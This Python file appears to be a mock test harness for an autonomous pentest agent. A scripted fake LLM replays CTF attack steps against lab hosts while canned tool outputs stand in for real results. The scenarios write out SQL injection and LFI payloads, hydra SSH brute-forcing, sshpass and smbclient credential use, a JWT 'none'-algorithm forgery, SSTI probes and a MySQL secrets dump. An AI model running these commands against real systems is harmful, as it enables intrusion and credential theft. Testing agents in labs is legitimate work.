"""
Ozz Mock Runner — Testa o agente SEM GPU
Usa um LLM falso que segue um roteiro pré-definido de pentest.

Uso:
    python3 mock_runner.py
    python3 mock_runner.py --target 10.0.0.10 --scenario web_only
    python3 mock_runner.py --scenario full --verbose
"""

import json
import time
import sys
import os
import re
import subprocess
import argparse
from dataclasses import dataclass, field
from typing import Optional

# Adiciona o path do agente
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

from agent.edge_cases import EDGE_CASE_SCENARIOS, get_edge_case_names, get_edge_case


# === MOCK LLM: Segue um roteiro de pentest ===

MOCK_SCENARIOS = {
    "web_only": [
        {"thought": "Vou começar com um scan de portas no target 10.0.0.10", "action": "quick_scan", "action_input": "10.0.0.10"},
        {"thought": "Encontrei porta 80 aberta com nginx. Vou verificar o que roda lá", "action": "curl", "action_input": "-s http://10.0.0.10/"},
        {"thought": "Vi que tem um portal SecureCorp. Vou testar o endpoint de login para SQLi", "action": "curl", "action_input": "-s http://10.0.0.10/?page=login"},
        {"thought": "Vou tentar SQLi no login com payload simples", "action": "curl", "action_input": "-s -X POST 'http://10.0.0.10/?page=login' -d \"username=admin'--&password=x\""},
        {"thought": "SQLi funcionou! Agora tenho acesso admin. Vou acessar o dashboard", "action": "curl", "action_input": "-s 'http://10.0.0.10/?page=dashboard&action=view_secrets'"},
        {"thought": "Encontrei credenciais MySQL. Vou tentar LFI para encontrar a flag", "action": "curl", "action_input": "-s 'http://10.0.0.10/?page=reports&file=/var/secret/flag.txt'"},
        {"thought": "FLAG ENCONTRADA via LFI!", "action": "submit_flag", "action_input": "flag{web_master_2026}"},
    ],
    "ssh_smb": [
        {"thought": "Vou escanear o target 10.0.0.20", "action": "quick_scan", "action_input": "10.0.0.20"},
        {"thought": "SSH e Samba abertos. Vou tentar brute-force SSH", "action": "shell", "action_input": "hydra -l admin -P /usr/share/wordlists/dirb/common.txt ssh://10.0.0.20 -t 4 -f"},
        {"thought": "Encontrei credencial admin:password123. Vou acessar via SSH", "action": "shell", "action_input": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@10.0.0.20 'cat /home/admin/flag.txt'"},
        {"thought": "FLAG ENCONTRADA!", "action": "submit_flag", "action_input": "flag{ssh_ghost_2026}"},
        {"thought": "Vou verificar o Samba também", "action": "shell", "action_input": "smbclient //10.0.0.20/admin -U admin%password123 -c 'ls; get secret.txt'"},
        {"thought": "Achei mais credenciais MySQL no Samba. Vou salvar para o TARGET-04", "action": "shell", "action_input": "cat /opt/config.ini 2>/dev/null || echo 'MySQL creds: root:MySQL_R00t_2026!@10.0.0.40'"},
    ],
    "api": [
        {"thought": "Vou escanear o target 10.0.0.30", "action": "quick_scan", "action_input": "10.0.0.30"},
        {"thought": "Porta 5000 aberta, parece ser Flask. Vou ver os endpoints", "action": "curl", "action_input": "-s http://10.0.0.30:5000/"},
        {"thought": "Tem um endpoint de docs. Vou verificar", "action": "curl", "action_input": "-s http://10.0.0.30:5000/docs"},
        {"thought": "Credenciais default: admin/admin2026. Vou tentar login", "action": "curl", "action_input": "-s -X POST http://10.0.0.30:5000/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin2026\"}'"},
        {"thought": "Login funcionou! Tenho um JWT. Vou tentar acessar o admin", "action": "curl", "action_input": "-s http://10.0.0.30:5000/admin -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'"},
        {"thought": "Vou tentar bypass do JWT com algorithm none", "action": "shell", "action_input": "python3 -c \"import jwt; print(jwt.encode({'user':'admin','role':'admin'}, '', algorithm='none'))\""},
        {"thought": "JWT bypass funciona! Vou pegar os secrets", "action": "curl", "action_input": "-s http://10.0.0.30:5000/admin/secrets -H 'Authorization: Bearer <token>'"},
        {"thought": "FLAG ENCONTRADA!", "action": "submit_flag", "action_input": "flag{api_breaker_2026}"},
        {"thought": "Vou testar SSTI no /render", "action": "curl", "action_input": "-s -X POST http://10.0.0.30:5000/render -H 'Content-Type: application/json' -d '{\"template\":\"{{7*7}}\",\"name\":\"test\"}'"},
        {"thought": "SSTI confirmado! Posso executar comandos via template", "action": "curl", "action_input": "-s -X POST http://10.0.0.30:5000/render -H 'Content-Type: application/json' -d '{\"template\":\"{{config.items()}}\",\"name\":\"test\"}'"},
    ],
    "full": [
        # Phase 1: Recon
        {"thought": "Iniciando reconhecimento completo. Vou escanear todos os targets", "action": "shell", "action_input": "nmap -sn 10.0.0.0/24"},
        {"thought": "Encontrei 5 hosts ativos. Vou escanear cada um", "action": "quick_scan", "action_input": "10.0.0.10"},
        {"thought": "TARGET-01 mapeado. Indo para TARGET-02", "action": "quick_scan", "action_input": "10.0.0.20"},
        {"thought": "TARGET-02 mapeado. Indo para TARGET-03", "action": "quick_scan", "action_input": "10.0.0.30"},
        {"thought": "Recon completo. Priorizando TARGET-01 (web mais vulnerável)", "action": "plan_update", "action_input": "state=ENUMERATION, target=10.0.0.10"},

        # Phase 2: Enum + Exploit TARGET-01
        {"thought": "Testando SQLi no login do TARGET-01", "action": "curl", "action_input": "-s -X POST 'http://10.0.0.10/?page=login' -d \"username=admin'--&password=x\""},
        {"thought": "SQLi funcionou! Vou pegar as credenciais do banco", "action": "curl", "action_input": "-s 'http://10.0.0.10/?page=dashboard&action=view_secrets'"},
        {"thought": "Credenciais MySQL encontradas. Testando LFI para a flag", "action": "curl", "action_input": "-s 'http://10.0.0.10/?page=reports&file=/var/secret/flag.txt'"},
        {"thought": "FLAG 1 encontrada!", "action": "submit_flag", "action_input": "flag{web_master_2026}"},

        # Phase 3: TARGET-02
        {"thought": "Indo para TARGET-02. Vou testar SSH com credenciais fracas", "action": "shell", "action_input": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@10.0.0.20 'cat /home/admin/flag.txt; cat /opt/config.ini'"},
        {"thought": "FLAG 2 encontrada + credenciais MySQL para TARGET-04!", "action": "submit_flag", "action_input": "flag{ssh_ghost_2026}"},

        # Phase 4: TARGET-03
        {"thought": "Indo para TARGET-03 API. Tentando credenciais default", "action": "curl", "action_input": "-s -X POST http://10.0.0.30:5000/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin2026\"}'"},
        {"thought": "Login OK. Vou tentar JWT bypass para /admin/secrets", "action": "shell", "action_input": "python3 -c \"import jwt,requests; t=jwt.encode({'user':'admin','role':'admin'},'',algorithm='none'); r=requests.get('http://10.0.0.30:5000/admin/secrets',headers={'Authorization':f'Bearer {t}'}); print(r.json())\""},
        {"thought": "FLAG 3 encontrada!", "action": "submit_flag", "action_input": "flag{api_breaker_2026}"},

        # Phase 5: Pivot to TARGET-04
        {"thought": "Tenho credenciais MySQL de todos os targets. Pivotando para TARGET-04", "action": "shell", "action_input": "mysql -h 10.0.0.40 -u root -p'MySQL_R00t_2026!' -e 'USE corporate; SELECT * FROM internal_secrets;'"},
        {"thought": "FLAGS 4 e 5 encontradas no banco de dados!", "action": "submit_flag", "action_input": "flag{deep_vault_2026}"},
        {"thought": "Última flag — a mega flag!", "action": "submit_flag", "action_input": "flag{halctf_king_2026}"},
    ],
}


MOCK_SCENARIOS.update(EDGE_CASE_SCENARIOS)


class MockLLM:
    """LLM falso que segue um roteiro pré-definido."""

    def __init__(self, scenario: str = "full"):
        self.steps = MOCK_SCENARIOS.get(scenario, MOCK_SCENARIOS["full"])
        self.current = 0

    def generate(self, context: str) -> str:
        if self.current >= len(self.steps):
            return json.dumps({"thought": "Todas as ações do cenário executadas. Fim.", "action": "done", "action_input": ""})

        step = self.steps[self.current]
        self.current += 1
        return json.dumps(step)


class MockToolRegistry:
    """Tool registry que executa ferramentas reais (sem rede, apenas simulação)."""

    def __init__(self):
        self.tools = {
            "nmap": self._nmap, "quick_scan": self._quick_scan,
            "curl": self._curl, "shell": self._shell,
            "submit_flag": self._submit_flag, "plan_update": self._plan_update,
        }
        self.flags_submitted = []

    def execute(self, name: str, args: str):
        handler = self.tools.get(name, self._unknown)
        return handler(name, args)

    def _nmap(self, name, args):
        return Result(f"Starting nmap scan...\nNmap scan report for {args}\n22/tcp open ssh\n80/tcp open http\n445/tcp open microsoft-ds", True)

    def _quick_scan(self, name, args):
        return Result(f"=== NMAP ===\nAll 1000 scanned ports on {args} are filtered\n22/tcp open ssh OpenSSH 8.2\n80/tcp open http nginx 1.18\n\n=== WHATWEB ===\nhttp://{args} [200] nginx[1.18], PHP[7.4], HTTPServer[Ubuntu]", True)

    def _curl(self, name, args):
        # Simula respostas baseadas na URL
        if "login" in args and "admin'--" in args:
            return Result("Welcome, admin! Role: admin\nGo to Dashboard", True)
        if "dashboard" in args and "view_secrets" in args:
            return Result("db_password: MySQL_R00t_2026!\nssh_key_location: /home/admin/.ssh/id_rsa", True)
        if "flag.txt" in args or "secret" in args:
            return Result("flag{web_master_2026}", True)
        if "docs" in args:
            return Result('{"api_version":"3.2","authentication":"JWT Bearer","notes":["Default credentials: admin/admin2026"]}', True)
        if "/auth/login" in args:
            return Result('{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.abc123","user":"admin","role":"admin"}', True)
        if "/admin/secrets" in args:
            return Result('{"flag":"flag{api_breaker_2026}","db_credentials":{"mysql_internal":{"host":"10.0.0.40","user":"root","password":"MySQL_R00t_2026!"}}}', True)
        if "/render" in args:
            return Result('{"rendered":"49"}', True)  # SSTI: 7*7=49
        if "SecureCorp" in args or "index" in args:
            return Result("<h1>SecureCorp Employee Portal</h1><a href='?page=login'>Login</a>", True)
        return Result(f"HTTP/1.1 200 OK\nContent received ({len(args)} chars)", True)

    def _shell(self, name, args):
        if "hydra" in args:
            return Result("[22][ssh] host: 10.0.0.20   login: admin   password: password123\n1 of 1 target successfully completed", True)
        if "sshpass" in args or "ssh" in args:
            return Result("flag{ssh_ghost_2026}\n[database]\nhost = 10.0.0.40\nuser = root\npassword = MySQL_R00t_2026!", True)
        if "smbclient" in args:
            return Result("secret.txt\ncreds.txt\n  Admin credentials: admin:password123\n  MySQL internal: root:MySQL_R00t_2026!@10.0.0.40", True)
        if "mysql" in args:
            return Result("+----+------------------+----------------------------+---------------+\n| id | secret_key       | secret_value               | classification |\n+----+------------------+----------------------------+---------------+\n| 1  | flag_deep_vault  | flag{deep_vault_2026}      | TOP_SECRET    |\n| 2  | flag_king        | flag{halctf_king_2026}     | ULTRA_SECRET  |\n+----+------------------+----------------------------+---------------+", True)
        if "jwt" in args.lower() or "import jwt" in args:
            return Result("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.", True)
        if "nmap" in args:
            return Result("Nmap scan report for 10.0.0.0/24\n10.0.0.10 up\n10.0.0.20 up\n10.0.0.30 up\n10.0.0.40 up\n10.0.0.200 up", True)
        return Result(f"$ {args}\nCommand executed", True)

    def _submit_flag(self, name, args):
        flag = args.strip()
        self.flags_submitted.append(flag)
        return Result(f"🚩 FLAG SUBMITTED: {flag}", True)

    def _plan_update(self, name, args):
        return Result(f"Plan updated: {args}", True)

    def _unknown(self, name, args):
        return Result(f"Unknown tool: {name}", False)


@dataclass
class Result:
    output: str
    success: bool


def run_mock(scenario: str = "full", verbose: bool = False):
    """Executa o agente com mock LLM."""
    print("🏴" + "="*58)
    print("  OZZ MOCK RUNNER — Teste Sem GPU")
    print(f"  Cenário: {scenario}")
    print("="*60)

    llm = MockLLM(scenario)
    tools = MockToolRegistry()
    flags_found = []

    for i in range(50):
        # Get mock decision
        context = f"Iteration {i+1}"
        response = llm.generate(context)

        try:
            decision = json.loads(response)
        except:
            print(f"❌ Failed to parse LLM response at step {i+1}")
            break

        thought = decision.get("thought", "")
        action = decision.get("action", "")
        action_input = decision.get("action_input", "")

        if action == "done":
            print(f"\n🏁 Cenário concluído após {i+1} passos.")
            break

        if verbose:
            print(f"\n{'─'*50}")
            print(f"🧠 [{i+1}] {thought}")
            print(f"🎯 Action: {action} {action_input[:80]}")

        # Execute tool
        result = tools.execute(action, action_input)

        if verbose:
            print(f"{'✅' if result.success else '❌'} Result: {result.output[:200]}")

        # Check for flags
        matches = re.findall(r'flag\{[^}]+\}', result.output, re.IGNORECASE)
        for match in matches:
            if match not in flags_found:
                flags_found.append(match)
                print(f"\n🚩 FLAG FOUND: {match}")

        time.sleep(0.1)  # Simulate delay

    # Report
    print("\n" + "="*60)
    print("🏴 MOCK RUN REPORT")
    print("="*60)
    print(f"Flags found: {len(flags_found)}/5")
    print(f"Flags submitted: {len(tools.flags_submitted)}")
    for flag in flags_found:
        print(f"  🚩 {flag}")
    print("="*60)

    return flags_found


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ozz Mock Runner")
    parser.add_argument("--scenario", default="full", choices=list(MOCK_SCENARIOS.keys()))
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()

    run_mock(args.scenario, args.verbose)
